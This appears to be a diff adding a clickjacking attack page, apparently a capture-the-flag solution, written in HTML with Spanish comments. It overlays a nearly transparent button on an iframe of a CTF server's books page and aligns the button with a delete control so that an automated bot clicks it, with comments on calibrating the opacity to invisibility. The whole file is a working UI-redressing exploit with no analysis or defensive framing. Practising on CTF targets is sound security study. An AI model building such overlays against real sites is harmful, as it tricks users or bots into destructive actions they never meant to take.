@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Soporte Libros</title>
+    <style>
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; }
+
+        /* Contenedor relativo para posicionar el botón sobre el iframe */
+        .wrapper {
+            position: relative;
+            width: 100%;
+            height: 100%;
+        }
+
+        /* TU BOTÓN: El bot lo buscará por este ID */
+        #objetivo {
+            position: absolute;
+            z-index: 10; /* SIEMPRE ARRIBA */
+            /* COORDENADAS: Ajusta el 'top' para que coincida con el botón gris */
+            top: 910px; 
+            left: 50%;
+            transform: translateX(-50%);
+            width: 800px; /* Ancho aproximado del botón de borrar */
+            height: 50px;
+            opacity: 0.1; /* Ponlo en 0.5 para calibrar, luego a 0.001 */
+            cursor: pointer;
+            background: red; /* Solo para verlo mientras calibras */
+            border: none;
+        }
+
+        /* EL IFRAME: Estará debajo del botón */
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 1200px;
+            border: none;
+            z-index: 1;
+            /* IMPORTANTE: Este comando permite que el clic pase a través del 
+               iframe si el bot clica en nuestro botón transparente */
+            pointer-events: none; 
+        }
+    </style>
+</head>
+<body>
+
+    <div class="wrapper">
+        <button id="objetivo">BOTON INVISIBLE</button>
+
+        <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
+    </div>
+
+</body>
+</html>
